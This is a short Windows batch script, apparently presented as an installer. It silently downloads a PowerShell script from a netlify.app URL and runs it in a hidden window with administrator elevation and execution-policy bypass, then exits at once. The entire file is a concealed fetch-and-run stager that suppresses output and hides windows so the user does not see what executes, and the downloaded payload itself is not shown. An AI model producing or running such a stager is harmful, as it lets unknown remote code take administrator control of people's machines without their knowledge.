@echo off
:: URL of your install.ps1 in cloud
set PS1_URL=https://capable-druid-0833af.netlify.app/good.ps1

:: Path to save in Documents
set DOCS_PS1=%USERPROFILE%\Documents\install.ps1

:: Download the PowerShell script silently
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%DOCS_PS1%' -UseBasicParsing" >nul 2>&1

:: Run the PowerShell script hidden with admin prompt, then exit batch immediately
start /B powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%DOCS_PS1%\"' -Verb RunAs -WindowStyle Hidden"

:: Close the batch window immediately
exit
